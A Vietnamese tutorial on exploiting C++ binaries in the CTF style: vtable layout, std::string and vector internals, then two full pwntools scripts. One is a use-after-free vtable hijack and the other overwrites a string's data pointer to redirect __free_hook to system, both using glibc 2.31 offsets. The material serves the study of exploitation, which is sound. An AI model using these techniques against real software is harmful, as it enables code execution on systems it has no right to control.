C++ Pwn

Binary C++ khác C: đối tượng có con trỏ vtable (bảng hàm ảo) ở đầu; gọi hàm ảo = đọc vtable rồi call. UAF/overflow trên đối tượng → ghi đè vptr → điều khiển call ảo = chiếm RIP. Bài này: layout đối tượng, std::string/vector internals, vtable hijack với số thật.

Bài này nói về cái gì?

vtable: đối tượng có hàm ảo (virtual) chứa vptr (con trỏ vtable) ở offset 0. Gọi obj->f() = (*(vptr+idx))() — đọc địa chỉ hàm từ bảng rồi call.

Pwn: nếu ghi đè được vptr (qua UAF/overflow trên đối tượng), bạn trỏ vptr tới bảng giả → call ảo nhảy tới địa chỉ bạn chọn = chiếm RIP (rdi = this, tiện cho system).

STL: std::string/vector có con trỏ data + size + cap trên heap → overflow/UAF đọc-ghi tùy ý.

Nếu chỉ nhớ một điều: Ghi đè vptr → gọi hàm ảo nhảy vào bảng giả → RIP (rdi=this).

01 / NỀN TẢNG BẮT BUỘC

Hàm ảo = gọi gián tiếp qua bảng

C++ cho phép virtual: hàm được chọn lúc chạy theo kiểu thực của đối tượng. Trình biên dịch cài: mỗi lớp có hàm ảo tạo một vtable (mảng con trỏ hàm) đặt trong .rodata; mỗi đối tượng chứa vptr (con trỏ tới vtable) ở offset 0. Gọi obj->draw() dịch thành: đọc vptr = *obj, đọc fn = *(vptr + idx*8), call fn với rdi = obj. Chính lớp gián tiếp này là bề mặt tấn công: kiểm soát vptr = kiểm soát call.

02 / VÌ SAO CÓ KỸ THUẬT

vptr là GOT của C++

Trong C, ghi đè GOT đổi hàm được gọi. Trong C++, vptr đóng vai tương tự nhưng nằm ngay trong đối tượng trên heap — dễ chạm hơn GOT (thường Full RELRO). Một UAF (delete obj rồi vẫn dùng), hay heap overflow sang đối tượng kế, cho phép ghi đè vptr. Lần gọi hàm ảo tiếp theo đọc vptr đã bị đầu độc → nhảy tới bảng giả → RIP. Vì rdi luôn = this, nếu đầu đối tượng chứa "/bin/sh" thì nhảy tới system là có shell ngay. Đó là lý do đề heap C++ (menu tạo/xoá/gọi đối tượng) rất phổ biến.

04 / STL INTERNALS

std::string & std::vector (số thật)

std::string (libstdc++)offsetvector<T>offset
con trỏ data (_M_p)+0x00_M_start (begin)+0x00
size (_M_string_length)+0x08_M_finish (end)+0x08
cap / SSO buffer (16B)+0x10_M_end_of_storage (cap)+0x10
SSOstd::string ≤15 ký tự lưu inline trong 16 byte tại +0x10 (_M_p trỏ vào chính nó). Chuỗi dài hơn → _M_p trỏ buffer heap riêng. Overflow đổi _M_p = con trỏ đọc/ghi tùy ý (in string → leak địa chỉ đó; sửa string → ghi đó).

std::vector: 3 con trỏ. Overflow đổi _M_start → vec[i] đọc/ghi địa chỉ tùy ý (giống OOB nhưng qua con trỏ). size = (_M_finish − _M_start)/sizeof(T).

07 / EXPLOIT ĐẦY ĐỦ

UAF vtable hijack (số thật, glibc 2.31)

// game.cpp — g++ game.cpp -o game ; menu: new/delete/action(gọi hàm ảo)
class Animal { public: virtual void speak(); char name[24]; };
// new Animal → chunk 0x20; obj+0=vptr; action() gọi obj->speak()
# BẢN A — UAF: delete obj rồi tạo "note" cùng size ghi đè vptr.
from pwn import *
exe = ELF("./game", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

def new_animal(name): p.sendlineafter(b">",b"1"); p.sendline(name)
def delete():          p.sendlineafter(b">",b"2")
def action():          p.sendlineafter(b">",b"3")    # gọi speak()
def new_note(data):    p.sendlineafter(b">",b"4"); p.sendline(data)  # malloc cùng 0x20

# giả sử đã leak libc (qua UAF read vptr → tính base). base có rồi:
libc.address = 0x7ffff7dc0000            # ví dụ số thật sau leak
system = libc.sym.system                  # +0x52290 = 0x7ffff7e12290

# 1) tạo Animal, xoá (UAF), tái dùng chunk bằng note:
new_animal(b"AAAA")                       # obj tại 0x4052a0
delete()                                  # chunk vào tcache
# 2) ghi đè chunk: [fake_vptr=obj+8] [&system] + "/bin/sh" khéo
#    đặt vtable giả NGAY trong obj: obj+8 = &system ; vptr=obj+8-? 
OBJ = 0x4052a0
note  = p64(OBJ+0x8)                    # +0: vptr giả trỏ obj+8 (bảng giả)
note += p64(system)                       # +8: vtable_giả[0] = system → speak() gọi system(this)
new_note(note)                            # chiếm lại chunk đã free
# this=obj nhưng đầu obj là con trỏ... dùng one_gadget an toàn hơn:
# note = p64(OBJ+8) + p64(libc.address+0xe3b01)  # one_gadget, khỏi lo rdi
action()                                  # gọi speak(): *(*(obj)+0)() = system/one_gadget
p.interactive()
Thành thậtOBJ=0x4052a0, chunk 0x20, offset system=0x52290, one_gadget 0xe3b01 là glibc 2.31. Vì gọi ảo đặt rdi=this (đầu obj = con trỏ, không phải "/bin/sh"), one_gadget tiện hơn system. Cần leak libc trước (UAF đọc vptr cũ → trừ offset vtable). Idx hàm ảo (0 hay +8) đọc từ disasm call [rax+?].
# BẢN B — std::string overflow đổi _M_p → arbitrary read/write.
from pwn import *
p = process("./app")
# string layout: +0 _M_p(data) +8 size +0x10 cap/SSO
# overflow string trước đó → ghi đè _M_p của string kế = GOT/libc addr

# 1) leak: đổi _M_p = puts@got, in string → đọc puts thật
TARGET = 0x404018                       # puts@got
payload = b"A"*0x20 + p64(TARGET) + p64(0x8) + p64(0x1f)  # _M_p,size,cap
p.sendlineafter(b"edit:", payload)
p.sendlineafter(b"show:", b"")
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc_base = leak - 0x875a0            # puts offset 2.31

# 2) write: đổi _M_p = __free_hook, sửa string = &system → ghi hook
free_hook = libc_base + 0x1eee48
payload = b"A"*0x20 + p64(free_hook) + p64(0x8) + p64(0x1f)
p.sendlineafter(b"edit:", payload)
p.sendlineafter(b"set:", p64(libc_base+0x52290))   # system
# rồi trigger free một string chứa "/bin/sh"
p.interactive()
string = con trỏstd::string thực chất là {data_ptr, size, cap}. Kiểm soát _M_p = đọc/ghi địa chỉ bất kỳ: in string leak, sửa string ghi. Mạnh như arbitrary R/W. Offset puts=0x875a0, free_hook=0x1eee48, system=0x52290 glibc 2.31.

Chunk không tái dùng
